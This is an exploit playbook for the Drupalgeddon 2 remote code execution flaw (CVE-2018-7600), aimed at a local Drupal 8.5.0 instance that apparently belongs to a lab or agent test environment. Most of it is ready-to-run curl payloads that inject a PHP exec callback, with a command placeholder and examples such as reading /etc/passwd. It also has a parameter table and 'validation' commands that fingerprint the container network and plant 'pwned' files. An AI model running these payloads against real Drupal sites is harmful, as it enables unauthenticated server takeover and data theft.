# Drupal Exploit Playbook

**CVE**: CVE-2018-7600 (Drupalgeddon 2)
**Target**: http://localhost:8081
**Vulnerability**: RCE via Form API render array injection
**Authentication**: None required

## Detection

Send a benign command to confirm the target is vulnerable:

```bash
curl -k -s 'http://localhost:8081/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=id'
```

If vulnerable, the response contains `uid=33(www-data)` or similar.

## RCE Payload

```bash
curl -k -s 'http://localhost:8081/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=${CMD}"
```

Replace `${CMD}` with the command to execute (e.g., `id`, `whoami`, `cat /etc/passwd`).

## Exploit Parameters

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `element_parents` | `account/mail/%23value` | Traverses form structure to mail field |
| `mail[a][#post_render][]` | `exec` | Sets PHP callback function |
| `mail[a][#type]` | `markup` | Marks element as markup |
| `mail[a][#markup]` | `<command>` | The command to execute |

## Validation (3-Layer)

```bash
# L1 — Marker file absence
CMD="[ ! -f /tmp/agent_is_present ] && echo 'L1_PASS' || echo 'L1_FAIL'"

# L2 — Environment fingerprint
CMD="ip a | grep -E '172\.(1[6-9]|2[0-9]|3[01])' && echo 'L2_CONTAINER_NET'"

# L3 — Unique artifact
CMD="touch /tmp/pwned_\$(date +%s_%N) && ls -la /tmp/pwned_*"
```

## Notes

- Drupal 8.5.0 is pre-installed (SQLite database)
- The exploit works via Drupal's AJAX form rendering system
- The `#post_render` callback is executed during the AJAX response
- Commands run as `www-data` user
